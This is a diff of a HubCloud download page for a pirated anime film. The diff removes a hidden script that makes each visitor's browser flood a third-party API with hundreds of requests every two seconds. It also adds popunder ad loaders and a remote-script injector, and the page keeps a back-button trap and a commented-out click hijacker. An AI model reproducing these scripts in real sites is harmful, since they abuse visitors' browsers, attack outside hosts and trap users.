@@ -1,4 +1,11 @@
-<script data-cfasync="false" src="//d1vy7td57198sq.cloudfront.net/?dtyvd=1108348"></script>
+<script id="aclib" type="text/javascript" src="//acscdn.com/script/aclib.js"></script>
+<script type="text/javascript">
+    aclib.runPop({
+        zoneId: '10553222',
+    });
+</script>
+
+<!--<script data-cfasync="false" src="//dl4d3y1ajyv3q.cloudfront.net/?aydld=1220853"></script>-->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
     history.pushState(null, null, location.href);
@@ -133,7 +140,7 @@ document.addEventListener("DOMContentLoaded", function() {
 <body><center>
   <br/>
 <div class="header">
-HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
+HubCloud | <a href="https://hubcloud.foo/drive/admin">Login</a>
 </div>
 
 <div class="container">
@@ -160,7 +167,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div> 
 <p class="h3 text-success">Download Link Generated</p>
 <div class="input-group mb-3">
-  <input onclick="copy_link('ilink')" type="text" class="form-control" value="https://hubcloud.one/drive/bffzqlpqfllfcld" readonly="" id="ilink">
+  <input onclick="copy_link('ilink')" type="text" class="form-control" value="https://hubcloud.foo/drive/bffzqlpqfllfcld" readonly="" id="ilink">
   <div class="input-group-prepend">
     <span class="input-group-text btn" id="basic-addon2" onclick="copy_link('ilink')">Copy Share Link</span>
   </div>
@@ -176,8 +183,15 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     <span>If All Servers 🛜 are not working ❌ Then Please <br><b>Change Your Browser DNS To Cloudflare 🚀 or Use <a href="https://one.one.one.one/" target="_blank">VPN</a></b> <br><a href="https://tinyurl.com/Unblock-Ban-Site" target="_blank">How ? Click Here 👉 to Watch Tutorial 👀</a></span>
 </div>
 
-
-
+    
+    <a href="?token=a05d8e6416ce6b745a1073feeb9128a4" id="s3" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #2d50e2d1 !important;"><i class="fas fa-file-download fa-lg"></i> Download [FSLv2 Server]</a>
+    
+    <script>
+        const fsl = document.getElementById('s3');
+        if (fsl) fsl.href += '_1' + new Date().getMinutes();
+    </script>
+    
+    
 <div class="ad-container"></div>
 
 
@@ -187,10 +201,19 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
 
+    <a href="https://pub-6b25c191839c4b01a878de4fdde0227b.r2.dev/e35ec4a9a4efb5a154d0d10f9481dafc?token=1765557445" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
+    <script>
+        const fsl = document.getElementById('fsl');
+        if (fsl) fsl.href += '1' + new Date().getMinutes();
+    </script>
+
+
+
+
 
 
         
-        <a href="https://pixel.hubcdn.fans/?id=21492bc915e609dd058e14bb1731d738ecbabde075e6a57924162ee17ab2dba6af0b2d315bfff2e113a3726863be50a0c9f92cc3470ad452f0c3223d49e7798f489e32a7a439e049a23b6750a49eb3f8acb834067ea5a1c7e0633b4425202ed5::b78919f2dc0c38d42c4c5147b3d4702c" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
+        <a href="https://pixel.hubcdn.fans/?id=cf9da6de5b5cc1ca5b3e2520b5acf717edf501be7d93b65e393737c54cc02414e98b792baef67306766e1ada227050e941565d787d593d01503ab42aa92cc97a47e47ddd48df7d80a8e8c69d566d8d71fb824057bb75356c67cd624ebbd1497f::e0be1d5c31c2e9e9bce4002ad9cce30a" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
             <i class="fas fa-file-download fa-lg"></i> Download [Server : 10Gbps]</a>
             
             <p style="font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">
@@ -202,18 +225,11 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
         
         
 
-    <a href="https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1758025506" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
-    <script>
-        const fsl = document.getElementById('fsl');
-        if (fsl) fsl.href += '1' + new Date().getMinutes();
-    </script>
 
 
 
 
-    <a href="https://ddl2.cloudserver-1692958104.workers.dev/1397313204/a4d4a721744a9dfdbd8be7b27715738bbb80ca367d65277316db36bb584c0fbfe3c21108b9a243111ed7eec085a9d572ce5f7d7271507154b4d3d931114c3f8e4c2dce9cbb597557590a24a7083f463ed7369f491e73d260277b2545e1f6b9089f2467f185ac470832ea2089e27a5855e4204f396724eb836021b0a21b51bc5759b14c22bf8c0ca66f7680e0a44ff80bb09c20c28e93f2fdba3bd25769584e94ea466fca0aadafc2bdb59a70b319e25270e8502d4fb228d8c46c5a7d4f2af9c0::0f8e872aeeee57459e410e73b6e84d79/Crayon Shinchan Action Kamen vs Demon (1993) 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] (PitiPati-Ionicboy) (4kHDHub.com).mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
-    <p style="
-    font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">Resume is Supported in ZipDisk But please extract it as the files is inside zip</p>
+
 
 
 
@@ -237,7 +253,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     if(isAndroid()){
         android_launch.classList.remove("d-none");
         android_launch.addEventListener('click', ()=>{
-            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1758025506',scheme: 'https',type: 'video/x-matrosk',
+            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-6b25c191839c4b01a878de4fdde0227b.r2.dev/e35ec4a9a4efb5a154d0d10f9481dafc?token=1765557445',scheme: 'https',type: 'video/x-matrosk',
             });anchor.click();
         });
         
@@ -274,7 +290,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div>
 <div class="card">
 <div class="card-body" id="div1">
-<p id="sharelink" onclick="copy_link('div1')">https://hubcloud.one/drive/bffzqlpqfllfcld</p>
+<p id="sharelink" onclick="copy_link('div1')">https://hubcloud.foo/drive/bffzqlpqfllfcld</p>
 </div>
 <button class="btn btn-success btn-sm" id="button1" onclick="copy_link('div1')"><i class="fa fa-copy"></i> Copy Link</button>
 <script>
@@ -308,6 +324,7 @@ Msc
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
 
 <!--2dl-->
+    
 <div class="footer">
 
 <p>Made with <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-heart-fill" fill="red" xmlns="http://www.w3.org/2000/svg"> <path fill-rule="evenodd" d="M8 1.314C12.438-3.248 23.534 4.735 8 15-7.534 4.736 3.562-3.248 8 1.314z" /> </svg></p>
@@ -322,25 +339,44 @@ function cn(t){let e=window.location.protocol+"//"+window.location.host+t;histor
 function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
 </script>
 
-<script>
-function x(){
-    for (let i = 0; i < 369; i++) {
-    
-	 fetch("https://apis.damanworlds.world/api/"+new Date().getTime() + i, {
-          "method": "GET",
-          "mode": "no-cors",
-          "referrerPolicy": 'no-referrer',
-        });
-	}
-}
-x();
-const intervalId = setInterval(() => {
-    x();
-}, 2000)
-</script>
 
 <!--<script async src="https://greenanalytics.autos/recaptcha/v4_enc.js"></script>-->
 
 <!--<script>let s__=!1,observer=null;const sc_="a, button";function opst(e){if(!s__)return;e.preventDefault(),e.stopImmediatePropagation();let t=document.createElement("a");t.href=s__,t.target="_blank",t.rel="noopener noreferrer",t.click();let r=document.querySelectorAll(sc_);r.forEach(e=>{e.removeEventListener("click",opst)}),observer.disconnect()}function atchs(){let e=document.querySelectorAll(sc_);e.forEach(e=>{e.addEventListener("click",opst,{once:!0})})}window.addEventListener("message",function(e){try{let t=JSON.parse(e.data);t?.url&&(s__=t.url,atchs(),(observer=new MutationObserver(atchs)).observe(document.body,{childList:!0,subtree:!0}))}catch(r){}},!1);-->
 <!--</script>-->
 
+
+<script>
+function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
+</script>
+
+
+
+
+
+<script data-cfasync="false" type="text/javascript" id="clever-core">
+/* <![CDATA[ */
+    (function (document, window) {
+        var a, c = document.createElement("script"), f = window.frameElement;
+
+        c.id = "CleverCoreLoader98023";
+        c.src = "https://scripts.cleverwebserver.com/9afdf189fcae8189c250865783d52630.js";
+
+        c.async = !0;
+        c.type = "text/javascript";
+        c.setAttribute("data-target", window.name || (f && f.getAttribute("id")));
+        c.setAttribute("data-callback", "put-your-callback-function-here");
+        c.setAttribute("data-callback-url-click", "put-your-click-macro-here");
+        c.setAttribute("data-callback-url-view", "put-your-view-macro-here");
+
+        try {
+            a = parent.document.getElementsByTagName("script")[0] || document.getElementsByTagName("script")[0];
+        } catch (e) {
+            a = !1;
+        }
+
+        a || (a = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
+        a.parentNode.insertBefore(c, a);
+    })(document, window);
+/* ]]> */
+</script>
